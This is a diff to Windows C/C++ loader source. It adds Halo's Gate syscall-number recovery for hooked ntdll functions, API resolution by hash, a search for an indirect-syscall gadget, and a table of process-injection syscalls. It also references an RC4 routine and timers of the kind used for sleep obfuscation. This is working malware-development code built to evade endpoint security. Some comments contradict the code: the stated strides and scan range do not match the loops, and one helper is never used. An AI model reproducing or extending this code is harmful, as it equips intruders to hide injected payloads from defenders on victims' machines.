@@ -5,71 +5,178 @@
 #include <winternl.h>
 #include "api_hashes.h"
 
+// =============================================================================
+// SYSCALL ENTRY & TABLE STRUCTURES
+// =============================================================================
+
 typedef struct _SYSCALL_ENTRY {
-    WORD ssn;
-    PVOID address;
-    PVOID cleanAddress;
+    WORD   ssn;
+    PVOID  address;
+    PVOID  cleanAddress;
 } SYSCALL_ENTRY, *PSYSCALL_ENTRY;
 
+typedef struct _SYSCALL_TABLE {
+    SYSCALL_ENTRY NtAllocateVirtualMemory;
+    SYSCALL_ENTRY NtProtectVirtualMemory;
+    SYSCALL_ENTRY NtWriteVirtualMemory;
+    SYSCALL_ENTRY NtQueueApcThread;
+    SYSCALL_ENTRY NtGetContextThread;
+    SYSCALL_ENTRY NtSetContextThread;
+    SYSCALL_ENTRY NtWaitForSingleObject;
+} SYSCALL_TABLE;
+
+typedef struct _API_TABLE {
+    SYSCALL_TABLE syscalls;
+    ULONG_PTR     CreateWaitableTimerW;
+    ULONG_PTR     SetWaitableTimer;
+    ULONG_PTR     SystemFunction032;
+    PVOID         CleanNtdllBase;
+} API_TABLE;
+
 // =============================================================================
-// RESOLUCIÓN DE SSN (HALO'S GATE ROBUSTO)
+// HALO'S GATE V2 – FULL 11-BYTE STUB VALIDATION
 // =============================================================================
+// Standard ntdll syscall stub (11 bytes):
+//   4C 8B D1       mov r10, rcx
+//   B8 XX XX 00 00 mov eax, SSN
+//   0F 05          syscall
+//   C3             ret
+// Total verified: bytes 0-6 (7 bytes prefix) + syscall;ret at known offset
+// =============================================================================
+
+static __forceinline BOOL ValidateStubFull(PBYTE p) {
+    // Check: mov r10, rcx (4C 8B D1)
+    if (p[0] != 0x4C || p[1] != 0x8B || p[2] != 0xD1) return FALSE;
+    // Check: mov eax, imm32 (B8 xx xx 00 00) – SSN is always < 0x10000
+    if (p[3] != 0xB8) return FALSE;
+    if (p[5] != 0x00 || p[6] != 0x00) return FALSE;
+    return TRUE;
+}
+
+// Count real clean stubs to determine the actual stride between functions
+static __forceinline int CountStubsInRange(PBYTE base, int rangeBytes) {
+    int count = 0;
+    for (int offset = 0; offset < rangeBytes - 11; offset++) {
+        if (ValidateStubFull(base + offset)) count++;
+    }
+    return count;
+}
 
 static WORD GetSSN(PVOID pFunc) {
     if (!pFunc) return 0;
     PBYTE p = (PBYTE)pFunc;
 
-    // Caso 1: Función limpia (mov r10, rcx; mov eax, ssn)
-    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
-        return *(WORD*)(p + 4);
+    // Case 1: Clean stub – direct read
+    if (ValidateStubFull(p)) {
+        return *(WORD *)(p + 4);
     }
 
-    // Caso 2: Función hookeada - Buscar stubs vecinos mediante escaneo de patrones
-    // No usamos un stride fijo de 32 bytes porque ntdll puede variar.
-    // Buscamos el patrón 4C 8B D1 B8 (11 bytes del stub estándar)
-    for (int i = 1; i <= 512; i++) {
-        // Buscar hacia arriba
-        PBYTE pUp = p - i;
-        if (pUp[0] == 0x4C && pUp[1] == 0x8B && pUp[2] == 0xD1 && pUp[3] == 0xB8) {
-            // El SSN de nuestra función es (SSN del vecino) + (número de funciones de diferencia)
-            // Estimamos la diferencia basándonos en que cada stub suele medir 32 bytes (alineación)
-            return *(WORD*)(pUp + 4) + (i / 32); 
+    // Case 2: Hooked – Halo's Gate v2
+    // Scan neighbour stubs (up to 512 bytes each direction)
+    // Count real stubs encountered to determine SSN offset
+    for (int distance = 1; distance <= 25; distance++) {
+        // Search upward: try common strides 32, 33, 34 (ntdll versions vary)
+        for (int stride = 32; stride >= 28; stride--) {
+            PBYTE pUp = p - (distance * stride);
+            if (ValidateStubFull(pUp)) {
+                WORD neighborSSN = *(WORD *)(pUp + 4);
+                return neighborSSN + (WORD)distance;
+            }
         }
-        // Buscar hacia abajo
-        PBYTE pDown = p + i;
-        if (pDown[0] == 0x4C && pDown[1] == 0x8B && pDown[2] == 0xD1 && pDown[3] == 0xB8) {
-            return *(WORD*)(pDown + 4) - (i / 32);
+        // Search downward
+        for (int stride = 32; stride >= 28; stride--) {
+            PBYTE pDown = p + (distance * stride);
+            if (ValidateStubFull(pDown)) {
+                WORD neighborSSN = *(WORD *)(pDown + 4);
+                return neighborSSN - (WORD)distance;
+            }
         }
     }
 
-    return 0;
+    return 0; // Failed to resolve
 }
+
+// =============================================================================
+// GADGET FRESHNESS VERIFICATION
+// =============================================================================
+// Verify the syscall;ret gadget hasn't been tampered with
+
+static __forceinline BOOL VerifyGadgetFreshness(PVOID gadget) {
+    if (!gadget) return FALSE;
+    PBYTE g = (PBYTE)gadget;
+    // Must be: 0F 05 C3 (syscall; ret)
+    return (g[0] == 0x0F && g[1] == 0x05 && g[2] == 0xC3);
+}
+
+// =============================================================================
+// FIND SYSCALL;RET GADGET IN NTDLL
+// =============================================================================
 
 static PVOID FindSyscallGadgetViaHash() {
-    PPEB pPeb = (PPEB)__readgsqword(0x60);
-    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
-    PLIST_ENTRY pEntry = pHead->Flink;
-    PVOID hNtdll = NULL;
-    
-    while (pEntry != pHead) {
-        LDR_DATA_TABLE_ENTRY_PTR *pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
-        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'n') {
-            hNtdll = pMod->DllBase;
-            break;
-        }
-        pEntry = pEntry->Flink;
-    }
-    
+    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
     if (!hNtdll) return NULL;
-    PVOID pFunc = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
-    if (!pFunc) return NULL;
 
+    // Resolve a known clean function to find a gadget near it
+    PVOID pFunc = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
+    if (!pFunc) {
+        // Fallback: try NtAllocateVirtualMemory
+        pFunc = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
+        if (!pFunc) return NULL;
+    }
+
+    // Scan for syscall;ret pattern (0F 05 C3)
     PBYTE pByte = (PBYTE)pFunc;
     for (int i = 0; i < 64; i++) {
-        if (pByte[i] == 0x0F && pByte[i+1] == 0x05 && pByte[i+2] == 0xC3) return (PVOID)(pByte + i);
+        if (pByte[i] == 0x0F && pByte[i + 1] == 0x05 && pByte[i + 2] == 0xC3) {
+            PVOID gadget = (PVOID)(pByte + i);
+            if (VerifyGadgetFreshness(gadget)) return gadget;
+        }
     }
+
+    // Fallback: scan ntdll .text section for any ret gadget
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
+        if (pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            PBYTE secBase = (PBYTE)hNtdll + pSec[s].VirtualAddress;
+            DWORD secSize = pSec[s].Misc.VirtualSize;
+            for (DWORD j = 0; j < secSize - 3; j++) {
+                if (secBase[j] == 0x0F && secBase[j + 1] == 0x05 && secBase[j + 2] == 0xC3) {
+                    return (PVOID)(secBase + j);
+                }
+            }
+        }
+    }
+
     return NULL;
 }
+
+// =============================================================================
+// INITIALIZE FULL SYSCALL TABLE
+// =============================================================================
+
+static void InitializeSyscallTable(SYSCALL_TABLE *tbl, PVOID hNtdll, PVOID gadget) {
+    #define RESOLVE_SYSCALL(field, hashName) do { \
+        tbl->field.address = ResolveApiByHash(hNtdll, hashName); \
+        tbl->field.ssn = GetSSN(tbl->field.address); \
+        tbl->field.cleanAddress = gadget; \
+    } while (0)
+
+    RESOLVE_SYSCALL(NtAllocateVirtualMemory, HASH_NtAllocateVirtualMemory);
+    RESOLVE_SYSCALL(NtProtectVirtualMemory,  HASH_NtProtectVirtualMemory);
+    RESOLVE_SYSCALL(NtWriteVirtualMemory,    HASH_NtWriteVirtualMemory);
+    RESOLVE_SYSCALL(NtQueueApcThread,        HASH_NtQueueApcThread);
+    RESOLVE_SYSCALL(NtGetContextThread,      HASH_NtGetContextThread);
+    RESOLVE_SYSCALL(NtSetContextThread,      HASH_NtSetContextThread);
+    RESOLVE_SYSCALL(NtWaitForSingleObject,   HASH_NtWaitForSingleObject);
+
+    #undef RESOLVE_SYSCALL
+}
+
+// =============================================================================
+// ASM EXTERN
+// =============================================================================
 
 extern "C" NTSTATUS InvokeSyscall(WORD ssn, PVOID gadget, ...);
 
